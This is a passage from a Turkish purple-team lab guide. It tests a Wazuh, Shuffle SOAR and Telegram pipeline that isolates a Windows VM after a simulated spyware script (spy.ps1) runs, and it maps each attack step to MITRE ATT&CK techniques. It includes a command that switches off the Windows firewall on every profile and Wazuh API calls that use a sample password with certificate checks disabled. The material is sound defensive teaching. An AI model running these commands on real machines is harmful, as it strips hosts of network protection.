2. **Toggle** ile workflow'u **Active** yapın (yeşil konuma getirin)

---

### Adım 8.5: Uçtan Uca Test

1. **Windows 10 VM**'de spy.ps1'i tekrar çalıştırın:
   ```powershell
   & "C:\Users\Public\spy.ps1"
   ```

2. **Beklenen akış:**
   - Wazuh → Rule 100500 veya 100503 tetiklenir
   - Wazuh → Shuffle Webhook'a JSON gönderir
   - Shuffle → Telegram'a bildirim gönderir
   - Siz → **"✅ İzole Et"** butonuna basın
   - Shuffle → Wazuh REST API'ye `PUT /active-response` çağrısı yapar
   - Windows 10 VM ağ trafiği kesilir
   - Telegram'a **"✅ Makine izole edildi."** mesajı gelir

3. **İzolasyonu Doğrulama (Windows 10 VM'de):**
   ```cmd
   ping 8.8.8.8
   # Yanıt gelmemeli
   
   ping 192.168.100.10
   # Bu da yanıt vermemeli (Wazuh Agent bağlantısı da kesildi)
   ```

---

### Adım 8.6: İzolasyonu Kaldırma

Eğitim ortamında VM'yi tekrar ağa bağlamak için:

```powershell
# Windows 10 VM'de (doğrudan konsol üzerinden):
netsh advfirewall set allprofiles state off
```

**VEYA** Wazuh REST API üzerinden:
```bash
# Ubuntu VM'den:
TOKEN=$(curl -su admin:SecretPassword -k \
  -X GET "https://localhost:55000/security/user/authenticate?raw=true")

curl -k -X PUT "https://localhost:55000/active-response?agents_list=<AGENT_ID>" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command": "netsh advfirewall set allprofiles state off", "arguments": []}'
```

---

## Eğitim Sonu: Purple Team Döngüsü Özeti

```
┌────────────────────────────────────────────────────────────────┐
│                    PURPLE TEAM DÖNGÜSÜ                         │
│                                                                │
│  1. GÜN (RED)              2. GÜN (BLUE)                      │
│  ──────────────            ──────────────                      │
│  Metasploit Sızma    ──▶   Wazuh Agent Görünürlük             │
│  spy.ps1 Deploy      ──▶   Sysmon Event ID 1/3                │
│  Scheduled Task      ──▶   Rule 100500-100503                 │
│  webhook.site Exfil  ──▶   Shuffle SOAR Otomasyon             │
│                      ──▶   Telegram Human-in-the-Loop         │
│                      ──▶   Wazuh REST API İzolasyon           │
│                                                                │
│  Her saldırı tekniği → Bir detection rule → Otomatik yanıt   │
└────────────────────────────────────────────────────────────────┘
```

### Öğrenilen MITRE ATT&CK Teknik-Tespit Eşleşmeleri

| Teknik | ID | Tespit Yöntemi | Yanıt |
|---|---|---|---|
| PowerShell Execution | T1059.001 | Sysmon EID 1 + Rule 100500 | Telegram Alarm |
| Screen Capture | T1113 | spy.ps1 adı + Rule 100501 | Telegram Alarm |
| Scheduled Task | T1053.005 | schtasks.exe + Rule 100502 | Telegram Alarm |
| C2 Exfiltration | T1041 | Sysmon EID 3 + Rule 100503 | İzolasyon |

---

> **Eğitim Materyalleri ve İletişim**
> BAIBUSEC Discord/WhatsApp kanalı üzerinden sorularınızı iletebilirsiniz.
> Dokümanı hazırlayan: BAIBUSEC Eğitim Ekibi | CyberFirst'26
